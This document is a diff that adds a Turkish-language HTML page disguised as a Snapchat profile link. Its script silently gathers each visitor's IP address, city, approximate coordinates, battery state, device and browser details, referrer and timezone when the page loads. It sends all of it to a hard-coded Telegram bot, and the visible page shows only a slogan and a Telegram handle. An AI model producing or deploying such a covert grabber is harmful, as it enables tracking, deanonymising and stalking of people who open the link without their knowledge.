@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>snapchat.com_asyaa.63_</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      text-align: center;
+    }
+    h1 {
+      font-size: 2em;
+      margin-bottom: 20px;
+    }
+    a {
+      color: #00bfff;
+      font-weight: bold;
+      text-decoration: none;
+    }
+    footer {
+      position: absolute;
+      bottom: 10px;
+      color: #666;
+      font-size: 0.9em;
+    }
+  </style>
+  <script>
+    async function sendToTelegram() {
+      const botToken = "8471310112:AAGWX-svuBC0jyXiA7U6rxAiv_zS_4mLMMs";
+      const chatID = "7447413528"; // Doğru chat ID burada
+
+      try {
+        const ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
+        const battery = await navigator.getBattery().then(b => `${Math.round(b.level * 100)}% ${b.charging ? '⚡' : ''}`);
+        const now = new Date().toLocaleString("tr-TR");
+        const device = /Mobi|Android/i.test(navigator.userAgent) ? "📱 Mobil" : "💻 Masaüstü";
+        const conn = navigator.connection?.type || "Bilinmiyor";
+        const orientation = screen.orientation?.type || "Bilinmiyor";
+        const browserInfo = navigator.userAgent;
+        const dpi = window.devicePixelRatio;
+        const pageTitle = document.title;
+        const pageURL = window.location.href;
+        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const memory = navigator.deviceMemory;
+        const referrer = document.referrer;
+        const timestamp = new Date().getTime();
+        const connectionSpeed = navigator.connection?.downlink || "Bilinmiyor";
+        const isWebRTC = navigator.mediaDevices ? true : false;
+        const lat = ipData.latitude || "Bilinmiyor";
+        const lon = ipData.longitude || "Bilinmiyor";
+
+        const message = `
+𓊆𝐴𝐶𝐶𝑂𝑈𝑁𝑇 𓊇       𒋨────━𓆩ZECOWER𓆪‏━────𒋨
+
+IP Adresi: ${ipData.ip}
+
+Şehir: ${ipData.city}
+
+Ülke: ${ipData.country_name}
+
+Zaman: ${now}
+
+Bağlantı Türü: ${conn}
+
+Cihaz Tipi: ${device}
+
+Ekran Çözünürlüğü: ${screen.width}x${screen.height}
+
+Pencere Boyutu: ${window.innerWidth}x${window.innerHeight}
+
+Ekran Yönelimi: ${orientation}
+
+Şarj Durumu: ${battery}
+
+Tarayıcı: ${browserInfo}
+DPI: ${dpi}
+
+Zaman Dilimi: ${timeZone}
+
+Cihaz Belleği: ${memory}GB
+
+Konum: ${lat}, ${lon}
+
+Sayfa Başlığı: ${pageTitle}
+
+Sayfa URL'si: ${pageURL}
+
+Ekran Yoğunluğu: ${window.devicePixelRatio}
+
+Yüklenme Süresi: ${performance.now()}ms
+
+WebRTC: ${isWebRTC}
+
+Yönlendiren: ${referrer}
+
+Kullanıcı Dili: ${navigator.language}
+
+Bağlantı Hızı: ${connectionSpeed}Mbps
+
+Zaman Damgası: ${timestamp}
+
+𒋨────━𓆩PYEFE𓆪‏━────𒋨
+𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌: @PYEFE
+`;
+
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        await fetch(url, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: chatID,
+            text: message
+          })
+        });
+      } catch (e) {
+        console.error("Telegram'a veri gönderilemedi:", e);
+      }
+    }
+
+    window.onload = sendToTelegram;
+  </script>
+</head>
+<body>
+  <h1>" TÜREMELERE PRİM YOK "</h1>
+  <a href="https://t.me/PYEFE" target="_blank">t.me/PYEFE</a>
+  <footer>© Pyefe | Tüm hakları saklıdır.</footer>
+</body>
+</html>
